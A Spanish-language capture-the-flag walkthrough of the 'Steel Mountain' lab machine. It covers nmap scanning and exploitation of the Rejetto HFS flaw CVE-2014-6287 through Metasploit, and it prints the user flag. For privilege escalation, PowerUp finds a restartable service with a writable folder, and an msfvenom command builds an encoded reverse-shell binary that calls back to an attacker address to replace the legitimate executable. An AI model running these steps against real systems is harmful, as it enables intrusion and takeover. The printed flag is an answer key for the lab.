@@ -1,0 +1,31 @@
+Hola, esté es mi Write up de la Maquina Steel Mountain 
+
+Bueno Obviamente lo primero que realicé fue un Scan
+sudo nmap sudo nmap -p- -sV -T4 -A 10.10.13.172 -vvv
+En realidad hice 2 el otro fue
+sudo nmap 10.10.13.172 -vvv 
+
+En el puerto 80 se encuentra una página web
+En la cual por ahora pude obtener el nombre y apellido de un empleado
+
+Luego en el puerto 8080 tambien se encuentra una página la cual me dio un servidor con el cual puedo vulnerar
+
+El numero CVE para vulnerar el servidor de archivos es 2014-6287
+Entré a Metasploit hice search 2014-6287
+Encontré exploit(windows/http/rejetto_hfs_exec)
+Así que usé ese exploit y obtuve acceso a la maquina
+Cuando gane acceso fui directo a conseguir la primera FLag que se encontraba en el Desktop del User Bill 
+Esta es la flag b04763b6fcf51fcd7c13abc7db4fd365
+
+Ahora Directo a escalar privilegios.
+Acá usé un script de PowerShell llamado PowerUp , cuyo propósito es evaluar una máquina con Windows y determinar cualquier anomalía:  " PowerUp pretende ser un centro de intercambio de información sobre los vectores comunes de escalada de privilegios de Windows  que dependen de configuraciones incorrectas " .
+
+Me encontré un servicio con una vulnerabilidad AdvancedSystemCareService9
+
+La opción CanRestart es verdadera, nos permite reiniciar un servicio en el sistema, el directorio de la aplicación también se puede escribir. Esto significa que podemos reemplazar la aplicación legítima por una maliciosa y reiniciar el servicio, que ejecutará nuestro programa infectado.
+
+Utilicé msfvenom -p windows/shell_reverse_tcp LHOST=10.8.56.237 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+Subí mi binario y remplacé el anterior.
+
+
